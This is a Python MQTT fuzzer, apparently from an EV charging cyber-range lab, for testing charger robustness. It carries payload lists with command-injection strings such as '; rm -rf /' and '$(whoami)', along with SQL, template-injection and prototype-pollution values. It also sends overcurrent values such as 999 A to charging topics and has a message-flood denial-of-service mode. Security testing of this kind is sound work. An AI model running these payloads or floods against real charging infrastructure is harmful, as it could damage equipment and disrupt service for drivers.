#!/usr/bin/env python3
"""
EV-CyberRange MQTT Fuzzer
Fuzzes MQTT topics with malformed/malicious payloads to test EVSE robustness.

Usage:
    python3 mqtt_fuzzer.py --target everest-mqtt --topic everest_api/connector_1/cmd/set_max_current
    python3 mqtt_fuzzer.py --target everest-mqtt --mode enumerate
    python3 mqtt_fuzzer.py --target everest-mqtt --mode flood --rate 1000
"""

import argparse
import json
import os
import random
import string
import sys
import time
from datetime import datetime

try:
    import paho.mqtt.client as mqtt
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn
except ImportError:
    print("Installing required packages...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "paho-mqtt", "rich"])
    import paho.mqtt.client as mqtt
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()

# Fuzz payloads for different attack types
FUZZ_PAYLOADS = {
    "malformed_json": [
        '{"key": "value"',           # Missing closing brace
        '{"key": }',                  # Missing value
        '{key: "value"}',            # Unquoted key
        '{"key": undefined}',        # JavaScript undefined
        '{"key": NaN}',              # NaN value
        '{"a"' * 1000 + '}',         # Deep nesting
        '',                          # Empty
        'null',                      # Null
        '[]',                        # Empty array
        '{"__proto__": {"admin": true}}',  # Prototype pollution
    ],
    "injection": [
        '{"cmd": "; rm -rf /"}',
        '{"value": "$(whoami)"}',
        '{"sql": "\' OR 1=1 --"}',
        '{"xpath": "//user[name/text()=\'\']"}',
        '{"template": "{{7*7}}"}',
        '{"ssti": "${7*7}"}',
    ],
    "overflow": [
        '{"value": ' + str(2**64) + '}',
        '{"value": -' + str(2**64) + '}',
        '{"value": 1e309}',
        '{"value": "' + 'A' * 10000 + '"}',
        '{"nested": ' + '{"a":' * 100 + '1' + '}' * 100 + '}',
    ],
    "type_confusion": [
        '{"max_current": "not_a_number"}',
        '{"max_current": [1,2,3]}',
        '{"max_current": {"nested": 32}}',
        '{"max_current": true}',
        '{"max_current": null}',
    ],
    "evse_specific": [
        # Charging control manipulation
        '{"max_current_A": 999}',        # Overcurrent
        '{"max_current_A": -10}',        # Negative current
        '{"max_current_A": 0}',          # Zero current
        '{"connector_id": 999}',         # Invalid connector
        '{"connector_id": -1}',          # Negative connector
        '{"state": "HACKED"}',           # Invalid state
        '{"energy_Wh": -99999}',         # Negative energy
        '{"id_tag": "' + 'A' * 100 + '"}',  # Long ID tag
    ],
}


class MQTTFuzzer:
    def __init__(self, host: str, port: int = 1883):
        self.host = host
        self.port = port
        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, f"fuzzer-{random.randint(1000,9999)}")
        self.discovered_topics = set()
        self.messages_sent = 0
        self.errors = []
        
    def connect(self) -> bool:
        try:
            self.client.on_connect = self._on_connect
            self.client.on_message = self._on_message
            self.client.connect(self.host, self.port, 60)
            self.client.loop_start()
            time.sleep(1)
            return True
        except Exception as e:
            console.print(f"[red]Connection failed: {e}[/red]")
            return False
    
    def _on_connect(self, client, userdata, flags, rc, properties=None):
        if rc == 0:
            console.print(f"[green]Connected to {self.host}:{self.port}[/green]")
        else:
            console.print(f"[red]Connection failed with code {rc}[/red]")
    
    def _on_message(self, client, userdata, msg):
        self.discovered_topics.add(msg.topic)
    
    def enumerate_topics(self, duration: int = 10) -> set:
        """Subscribe to wildcard and collect all topics."""
        console.print(f"[yellow]Enumerating topics for {duration}s...[/yellow]")
        self.client.subscribe("#")
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as progress:
            task = progress.add_task(f"Listening...", total=duration)
            for i in range(duration):
                time.sleep(1)
                progress.update(task, advance=1, description=f"Found {len(self.discovered_topics)} topics")
        
        self.client.unsubscribe("#")
        return self.discovered_topics
    
    def fuzz_topic(self, topic: str, payload_type: str = "all", count: int = 100):
        """Send fuzz payloads to a specific topic."""
        if payload_type == "all":
            payloads = []
            for category in FUZZ_PAYLOADS.values():
                payloads.extend(category)
        else:
            payloads = FUZZ_PAYLOADS.get(payload_type, [])
        
        console.print(f"[yellow]Fuzzing {topic} with {len(payloads)} payloads[/yellow]")
        
        table = Table(title=f"Fuzzing Results: {topic}")
        table.add_column("Payload Type", style="cyan")
        table.add_column("Payload Preview", style="yellow")
        table.add_column("Status", style="green")
        
        for payload in payloads[:count]:
            try:
                result = self.client.publish(topic, payload, qos=0)
                status = "✓ Sent" if result.rc == 0 else f"✗ Error {result.rc}"
                self.messages_sent += 1
            except Exception as e:
                status = f"✗ {str(e)[:20]}"
                self.errors.append((topic, payload, str(e)))
            
            preview = payload[:50] + "..." if len(payload) > 50 else payload
            table.add_row(payload_type, preview, status)
            time.sleep(0.05)  # Rate limiting
        
        console.print(table)
    
    def flood_topic(self, topic: str, rate: int = 100, duration: int = 10):
        """DoS attack via message flooding."""
        console.print(f"[red]⚠ FLOOD ATTACK: {topic} @ {rate} msg/s for {duration}s[/red]")
        
        payload = json.dumps({"flood": True, "timestamp": ""})
        sent = 0
        start = time.time()
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as progress:
            task = progress.add_task("Flooding...", total=duration)
            while time.time() - start < duration:
                for _ in range(rate):
                    ts_payload = payload.replace('""', f'"{datetime.now().isoformat()}"')
                    self.client.publish(topic, ts_payload, qos=0)
                    sent += 1
                progress.update(task, advance=1, description=f"Sent {sent} messages")
                time.sleep(1)
        
        console.print(f"[green]Flood complete: {sent} messages sent[/green]")
        self.messages_sent += sent
    
    def report(self):
        """Print summary report."""
        console.print("\n" + "="*60)
        console.print("[bold]FUZZING REPORT[/bold]")
        console.print("="*60)
        console.print(f"Messages sent: {self.messages_sent}")
        console.print(f"Topics discovered: {len(self.discovered_topics)}")
        console.print(f"Errors encountered: {len(self.errors)}")
        
        if self.discovered_topics:
            console.print("\n[cyan]Discovered Topics:[/cyan]")
            for topic in sorted(self.discovered_topics)[:20]:
                console.print(f"  • {topic}")
            if len(self.discovered_topics) > 20:
                console.print(f"  ... and {len(self.discovered_topics) - 20} more")
    
    def disconnect(self):
        self.client.loop_stop()
        self.client.disconnect()


def main():
    parser = argparse.ArgumentParser(description="EV-CyberRange MQTT Fuzzer")
    parser.add_argument("--target", "-t", default=os.getenv("MQTT_HOST", "localhost"), 
                        help="MQTT broker hostname")
    parser.add_argument("--port", "-p", type=int, default=int(os.getenv("MQTT_PORT", 1883)),
                        help="MQTT broker port")
    parser.add_argument("--mode", "-m", choices=["fuzz", "enumerate", "flood"], default="fuzz",
                        help="Operation mode")
    parser.add_argument("--topic", help="Target topic for fuzzing")
    parser.add_argument("--payload-type", choices=list(FUZZ_PAYLOADS.keys()) + ["all"], 
                        default="all", help="Type of fuzz payloads")
    parser.add_argument("--rate", type=int, default=100, help="Messages per second (flood mode)")
    parser.add_argument("--duration", type=int, default=10, help="Duration in seconds")
    parser.add_argument("--count", type=int, default=100, help="Number of payloads to send")
    
    args = parser.parse_args()
    
    console.print("[bold blue]EV-CyberRange MQTT Fuzzer[/bold blue]")
    console.print(f"Target: {args.target}:{args.port}")
    
    fuzzer = MQTTFuzzer(args.target, args.port)
    
    if not fuzzer.connect():
        sys.exit(1)
    
    try:
        if args.mode == "enumerate":
            topics = fuzzer.enumerate_topics(args.duration)
            
        elif args.mode == "flood":
            if not args.topic:
                console.print("[red]--topic required for flood mode[/red]")
                sys.exit(1)
            fuzzer.flood_topic(args.topic, args.rate, args.duration)
            
        elif args.mode == "fuzz":
            if not args.topic:
                # Auto-discover and fuzz interesting topics
                console.print("[yellow]No topic specified, discovering...[/yellow]")
                topics = fuzzer.enumerate_topics(5)
                # Fuzz command topics (most interesting)
                cmd_topics = [t for t in topics if "/cmd/" in t or "/cmd" in t]
                if cmd_topics:
                    for topic in cmd_topics[:3]:
                        fuzzer.fuzz_topic(topic, args.payload_type, args.count)
                else:
                    console.print("[yellow]No command topics found, fuzzing first discovered topic[/yellow]")
                    if topics:
                        fuzzer.fuzz_topic(list(topics)[0], args.payload_type, args.count)
            else:
                fuzzer.fuzz_topic(args.topic, args.payload_type, args.count)
        
        fuzzer.report()
        
    finally:
        fuzzer.disconnect()


if __name__ == "__main__":
    main()
